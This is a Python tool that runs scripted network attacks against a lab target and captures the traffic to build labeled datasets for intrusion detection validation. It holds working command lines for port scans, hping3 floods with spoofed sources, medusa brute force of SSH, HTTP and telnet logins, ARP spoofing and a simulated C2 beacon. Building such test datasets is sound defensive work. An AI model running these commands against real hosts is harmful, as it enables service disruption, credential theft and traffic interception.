#!/usr/bin/env python3
"""
attack_orchestrator.py — Run and quantify multiple IDS-validation attacks.

Executes attack modules against a target, captures traffic with tcpdump,
analyzes each pcap with tshark/capinfos, and produces a timestamped report
(JSON + CSV) with per-attack flow/packet/byte metrics ready for labeling.

Usage:
    sudo python3 scripts/attack_orchestrator.py [options]

Options:
    --target   IP           Target (default: 192.168.100.5)
    --iface    IFACE        Capture interface (default: eth0)
    --output   DIR          Directory for pcaps + reports
    --attacks  LIST         Comma-separated subset, e.g. recon,dos,spoofing
                            Available: recon, dos, ddos, bruteforce, web,
                                       mitm, spoofing, malware
    --duration N            Seconds for time-bounded attacks (default: 30)
    --dry-run               Print commands without executing
    --skip-capture          Skip tcpdump (analyze only if pcaps exist)
    --wordlist PATH         Custom password wordlist (overrides built-in fallback)
"""

import argparse
import csv
import json
import os
import signal
import subprocess
import sys
import tempfile
import time
from dataclasses import asdict, dataclass, field
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Optional

# ── Defaults ──────────────────────────────────────────────────────────────────

DEFAULT_TARGET   = "192.168.100.5"
DEFAULT_IFACE    = "eth0"
DEFAULT_OUTPUT   = "/home/linkezio/Datasets/attack_testing"
DEFAULT_DURATION = 30  # seconds for time-bounded attacks

# Standard wordlist paths (Arch Linux / rockyou)
WORDLIST_PASS  = "/usr/share/wordlists/rockyou.txt"
WORDLIST_WEB   = "/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt"
WORDLIST_USERS = "/usr/share/wordlists/dirbuster/apache-user-enum-1.0.txt"

# Minimal inline fallbacks when wordlists are not installed
FALLBACK_PASSWORDS = [
    "admin", "root", "password", "123456", "toor", "admin123",
    "pass", "test", "12345", "qwerty", "letmein", "welcome",
    "monkey", "dragon", "master", "sunshine", "princess",
]
FALLBACK_WEBPATHS = [
    "admin", "login", "index", "backup", "config", "test",
    "api", "wp-admin", "phpmyadmin", "shell", "cmd", "upload",
    "console", "dashboard", "manage", "panel", "status", "info",
]

# ── Data model ────────────────────────────────────────────────────────────────

@dataclass
class AttackStats:
    attack:           str = ""
    label:            str = ""
    start_time:       str = ""
    end_time:         str = ""
    duration_s:       float = 0.0
    pcap_path:        str = ""
    pcap_size_bytes:  int = 0
    total_packets:    int = 0
    total_bytes:      int = 0
    fwd_packets:      int = 0
    bwd_packets:      int = 0
    tcp_flows:        int = 0
    udp_flows:        int = 0
    icmp_flows:       int = 0
    total_flows:      int = 0
    capture_duration: float = 0.0
    commands_run:     List[str] = field(default_factory=list)
    skipped:          bool = False
    skip_reason:      str = ""

# ── Helpers ───────────────────────────────────────────────────────────────────

def require_root() -> None:
    if os.geteuid() != 0:
        sys.exit("[!] Run as root: sudo python3 scripts/attack_orchestrator.py")


def tool_available(name: str) -> bool:
    return subprocess.run(["which", name], capture_output=True).returncode == 0


def run_cmd(cmd: str, timeout: Optional[int] = None) -> subprocess.CompletedProcess:
    try:
        return subprocess.run(
            cmd, shell=True, timeout=timeout,
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        )
    except subprocess.TimeoutExpired:
        return subprocess.CompletedProcess(cmd, returncode=-1)


def make_wordlist(words: List[str]) -> str:
    """Write a list of words to a temp file and return its path."""
    f = tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False)
    f.write("\n".join(words) + "\n")
    f.flush()
    return f.name


def resolve_wordlist(standard_path: str, fallback: List[str]) -> tuple[str, bool]:
    """Return (path, is_temp). If standard path missing, write fallback to temp."""
    if Path(standard_path).exists():
        return standard_path, False
    tmp = make_wordlist(fallback)
    print(f"  [!] {standard_path} not found — using {len(fallback)}-entry fallback")
    return tmp, True


def start_capture(pcap_path: str, iface: str, target: str) -> subprocess.Popen:
    cmd = f"tcpdump -i {iface} -w {pcap_path} -n -s 0 host {target} 2>/dev/null"
    proc = subprocess.Popen(cmd, shell=True, preexec_fn=os.setsid)
    time.sleep(0.8)
    return proc


def stop_capture(proc: subprocess.Popen) -> None:
    try:
        os.killpg(os.getpgid(proc.pid), signal.SIGINT)
        proc.wait(timeout=5)
    except Exception:
        try:
            proc.kill()
        except Exception:
            pass
    time.sleep(0.5)


def analyze_pcap(pcap_path: str, target: str) -> Dict:
    """Use capinfos + tshark to extract flow/packet metrics from a pcap."""
    stats: Dict = {
        "total_packets": 0,
        "total_bytes": 0,
        "fwd_packets": 0,
        "bwd_packets": 0,
        "tcp_flows": 0,
        "udp_flows": 0,
        "icmp_flows": 0,
        "total_flows": 0,
        "capture_duration": 0.0,
        "pcap_size_bytes": 0,
    }

    p = Path(pcap_path)
    if not p.exists() or p.stat().st_size == 0:
        return stats

    stats["pcap_size_bytes"] = p.stat().st_size

    # capinfos: total packets, bytes, duration
    r = subprocess.run(
        ["capinfos", "-csdM", pcap_path],
        capture_output=True, text=True,
    )
    for line in r.stdout.splitlines():
        low = line.lower()
        if "number of packets" in low:
            try:
                stats["total_packets"] = int(line.split(":")[1].strip().replace(",", ""))
            except ValueError:
                pass
        elif "data size" in low:
            try:
                # "Data size:          123456 bytes"
                val = line.split(":")[1].strip().split()[0].replace(",", "")
                stats["total_bytes"] = int(val)
            except (ValueError, IndexError):
                pass
        elif "capture duration" in low:
            try:
                val = line.split(":")[1].strip().split()[0]
                stats["capture_duration"] = float(val)
            except (ValueError, IndexError):
                pass

    # tshark conv,tcp/udp/icmp — count unique flows
    for proto in ("tcp", "udp", "icmp"):
        r = subprocess.run(
            ["tshark", "-r", pcap_path, "-q", "-z", f"conv,{proto}"],
            capture_output=True, text=True,
        )
        flows = sum(1 for ln in r.stdout.splitlines() if "<->" in ln)
        stats[f"{proto}_flows"] = flows

    stats["total_flows"] = (
        stats["tcp_flows"] + stats["udp_flows"] + stats["icmp_flows"]
    )

    # Forward packets (src → target) and backward (target → src)
    r = subprocess.run(
        ["tshark", "-r", pcap_path, "-Y", f"ip.dst == {target}",
         "-T", "fields", "-e", "frame.number"],
        capture_output=True, text=True,
    )
    fwd = len([l for l in r.stdout.strip().splitlines() if l.strip()])
    stats["fwd_packets"] = fwd
    stats["bwd_packets"] = max(0, stats["total_packets"] - fwd)

    return stats


def print_stats(stats: AttackStats) -> None:
    print(f"  ├─ Flows  TCP/UDP/ICMP : {stats.tcp_flows} / {stats.udp_flows} / {stats.icmp_flows}  (total {stats.total_flows})")
    print(f"  ├─ Packets fwd/bwd     : {stats.fwd_packets} / {stats.bwd_packets}  (total {stats.total_packets})")
    print(f"  ├─ Bytes               : {stats.total_bytes:,}")
    print(f"  ├─ Capture duration    : {stats.capture_duration:.1f}s  (wall {stats.duration_s:.1f}s)")
    print(f"  └─ PCAP                : {stats.pcap_path}  ({stats.pcap_size_bytes:,} B)")


# ── Attack runner ─────────────────────────────────────────────────────────────

def run_attack(
    name: str,
    label: str,
    commands: List[str],
    output_dir: str,
    iface: str,
    target: str,
    duration: Optional[int],
    dry_run: bool,
    skip_capture: bool,
) -> AttackStats:
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    pcap_path = str(Path(output_dir) / f"{name}_{ts}.pcap")
    stats = AttackStats(attack=name, label=label, pcap_path=pcap_path, commands_run=commands)

    bar = "─" * 60
    print(f"\n{bar}")
    print(f"  ATAQUE: {label}  [{name}]")
    if duration:
        print(f"  Timeout por comando: {duration}s")

    if dry_run:
        for cmd in commands:
            print(f"  [DRY] {cmd}")
        return stats

    cap_proc = None
    if not skip_capture:
        cap_proc = start_capture(pcap_path, iface, target)

    stats.start_time = datetime.now().isoformat()
    t0 = time.perf_counter()

    try:
        for cmd in commands:
            print(f"  [>] {cmd}")
            run_cmd(cmd, timeout=duration)
    finally:
        if cap_proc:
            stop_capture(cap_proc)
        stats.end_time = datetime.now().isoformat()
        stats.duration_s = round(time.perf_counter() - t0, 2)

    if not skip_capture:
        pcap_stats = analyze_pcap(pcap_path, target)
        for k, v in pcap_stats.items():
            setattr(stats, k, v)

    print_stats(stats)
    return stats


# ── Attack definitions ────────────────────────────────────────────────────────

def build_attacks(target: str, duration: int, wordlist_override: Optional[str]) -> Dict:
    """Return {name: {"label", "cmds", "duration", "requires"}} for all attack types."""

    wl_pass, wl_pass_temp = resolve_wordlist(
        wordlist_override or WORDLIST_PASS, FALLBACK_PASSWORDS
    )
    wl_web, wl_web_temp = resolve_wordlist(WORDLIST_WEB, FALLBACK_WEBPATHS)

    attacks = {

        "recon": {
            "label": "Recon",
            "requires": ["nmap", "masscan"],
            "duration": None,   # runs to completion
            "cmds": [
                f"nmap -sS -T4 {target}",
                f"nmap -sU --top-ports 100 -T4 {target}",
                f"masscan {target} -p1-1024 --rate=500",
                f"nmap -A -T4 -p 22,23,80,443,8080 {target}",
            ],
        },

        "dos": {
            "label": "DoS",
            "requires": ["hping3"],
            "duration": duration,
            "cmds": [
                f"hping3 -S --flood -p 80 {target}",
                f"hping3 --udp --flood -p 53 {target}",
                f"hping3 --icmp --flood {target}",
            ],
        },

        "ddos": {
            "label": "DDoS",
            "requires": ["hping3"],
            "duration": duration,
            "cmds": [
                f"hping3 -S --flood -p 443 --rand-source {target}",
                f"hping3 --udp --flood -p 80 --rand-source {target}",
            ],
        },

        "bruteforce": {
            "label": "Brute Force",
            "requires": ["medusa"],
            "duration": duration,
            "cmds": [
                f"medusa -h {target} -u root -P {wl_pass} -M ssh -t 4 -f",
                f"medusa -h {target} -u admin -P {wl_pass} -M http -m DIR:/ -t 4 -f",
                f"medusa -h {target} -u root -P {wl_pass} -M telnet -t 2 -f",
            ],
        },

        "web": {
            "label": "Web Attacks",
            "requires": ["nikto", "gobuster"],
            "duration": duration,
            "cmds": [
                f"nikto -h http://{target} -maxtime {duration}s",
                f"gobuster dir -u http://{target} -w {wl_web} -t 10 -q",
                # HTTP flood (100 concurrent requests)
                f"bash -c 'for i in $(seq 1 100); do curl -s -o /dev/null http://{target}/ & done; wait'",
            ],
        },

        "mitm": {
            "label": "MITM",
            "requires": ["arpspoof"],
            "duration": duration,
            "cmds": [
                # arpspoof to gateway — needs actual gateway; uses .1 as convention
                f"arpspoof -i eth0 -t {target} {target.rsplit('.', 1)[0]}.1",
            ],
        },

        "spoofing": {
            "label": "Spoofing",
            "requires": ["hping3"],
            "duration": duration,  # safety cap; --faster makes each cmd finish in ~5s
            "cmds": [
                # --faster = 100 pkt/s; -c 500 → ~5s, -c 300 → ~3s
                f"hping3 -S --faster -p 80 -c 500 -a 1.2.3.4 {target}",
                f"hping3 --udp --faster -p 53 -c 300 -a 9.9.9.9 {target}",
                f"hping3 --icmp --faster -c 300 -a 8.8.8.8 {target}",
            ],
        },

        "malware": {
            "label": "Malware (C2/Mirai sim)",
            "requires": ["nmap", "nc"],
            "duration": None,
            "cmds": [
                # Mirai-style Telnet scan
                f"nmap -p 23,2323 -T5 {target}",
                # C2 beacon simulation: 100 short TCP connections
                f"bash -c 'for i in $(seq 1 100); do nc -z -w1 {target} 4444 2>/dev/null; sleep 0.05; done'",
                # SSH scan
                f"nmap -p 22 -T5 --open {target}",
            ],
        },


    }

    # Attach wordlist temps for cleanup later
    attacks["_temps"] = {"wl_pass_temp": wl_pass_temp, "wl_web_temp": wl_web_temp,
                         "wl_pass": wl_pass if wl_pass_temp else None,
                         "wl_web": wl_web if wl_web_temp else None}
    return attacks


# ── Report generation ─────────────────────────────────────────────────────────

def save_report(results: List[AttackStats], output_dir: str) -> None:
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    base = Path(output_dir) / f"report_{ts}"

    # JSON
    json_path = str(base) + ".json"
    with open(json_path, "w") as f:
        json.dump([asdict(r) for r in results], f, indent=2)

    # CSV — flat fields (list fields serialized as JSON strings)
    csv_path = str(base) + ".csv"
    if results:
        keys = [k for k in asdict(results[0]).keys() if k != "commands_run"]
        with open(csv_path, "w", newline="") as f:
            w = csv.DictWriter(f, fieldnames=keys)
            w.writeheader()
            for r in results:
                row = {k: v for k, v in asdict(r).items() if k != "commands_run"}
                w.writerow(row)

    print(f"\n{'═'*60}")
    print(f"  RELATÓRIO SALVO")
    print(f"  JSON : {json_path}")
    print(f"  CSV  : {csv_path}")
    print(f"{'═'*60}")


def print_summary(results: List[AttackStats]) -> None:
    print(f"\n{'═'*60}")
    print(f"  RESUMO DOS ATAQUES")
    print(f"{'─'*60}")
    hdr = f"  {'Ataque':<14} {'Label':<18} {'Flows':>7} {'Pkts':>8} {'Bytes':>12} {'Dur':>6}"
    print(hdr)
    print(f"{'─'*60}")
    for r in results:
        if r.skipped:
            print(f"  {r.attack:<14} {'SKIPPED':<18} {'—':>7} {'—':>8} {'—':>12} {'—':>6}  ({r.skip_reason})")
        else:
            print(
                f"  {r.attack:<14} {r.label:<18} {r.total_flows:>7,} {r.total_packets:>8,} "
                f"{r.total_bytes:>12,} {r.duration_s:>5.1f}s"
            )
    print(f"{'═'*60}")


# ── Main ──────────────────────────────────────────────────────────────────────

def main() -> None:
    parser = argparse.ArgumentParser(
        description="IDS validation attack orchestrator"
    )
    parser.add_argument("--target",       default=DEFAULT_TARGET)
    parser.add_argument("--iface",        default=DEFAULT_IFACE)
    parser.add_argument("--output",       default=DEFAULT_OUTPUT)
    parser.add_argument("--attacks",      default="all",
                        help="Comma-separated or 'all'")
    parser.add_argument("--duration",     type=int, default=DEFAULT_DURATION,
                        help="Seconds for time-bounded attacks")
    parser.add_argument("--dry-run",      action="store_true")
    parser.add_argument("--skip-capture", action="store_true",
                        help="Do not run tcpdump (useful for re-analyzing)")
    parser.add_argument("--wordlist",     default=None,
                        help="Custom password wordlist path")
    args = parser.parse_args()

    if not args.dry_run:
        require_root()

    Path(args.output).mkdir(parents=True, exist_ok=True)

    all_attacks = build_attacks(args.target, args.duration, args.wordlist)
    temps = all_attacks.pop("_temps")

    attack_order = ["recon", "dos", "ddos", "bruteforce", "web",
                    "mitm", "spoofing", "malware"]

    if args.attacks.lower() == "all":
        selected = attack_order
    else:
        selected = [a.strip() for a in args.attacks.split(",")]

    print(f"\n{'═'*60}")
    print(f"  ATTACK ORCHESTRATOR")
    print(f"  Target    : {args.target}")
    print(f"  Interface : {args.iface}")
    print(f"  Output    : {args.output}")
    print(f"  Attacks   : {', '.join(selected)}")
    print(f"  Duration  : {args.duration}s  (time-bounded attacks)")
    print(f"{'═'*60}")

    results: List[AttackStats] = []

    for name in selected:
        if name not in all_attacks:
            print(f"\n[!] Unknown attack '{name}' — skipping")
            continue

        cfg = all_attacks[name]
        missing = [t for t in cfg["requires"] if not tool_available(t)]
        if missing:
            s = AttackStats(attack=name, label=cfg["label"],
                            skipped=True, skip_reason=f"tools missing: {', '.join(missing)}")
            results.append(s)
            print(f"\n[!] Skipping {name}: {s.skip_reason}")
            continue

        result = run_attack(
            name=name,
            label=cfg["label"],
            commands=cfg["cmds"],
            output_dir=args.output,
            iface=args.iface,
            target=args.target,
            duration=cfg["duration"],
            dry_run=args.dry_run,
            skip_capture=args.skip_capture,
        )
        results.append(result)

    # Cleanup temp wordlists
    for key in ("wl_pass", "wl_web"):
        if temps.get(key) and Path(temps[key]).exists():
            try:
                os.unlink(temps[key])
            except OSError:
                pass

    if not args.dry_run:
        print_summary(results)
        save_report(results, args.output)


if __name__ == "__main__":
    main()
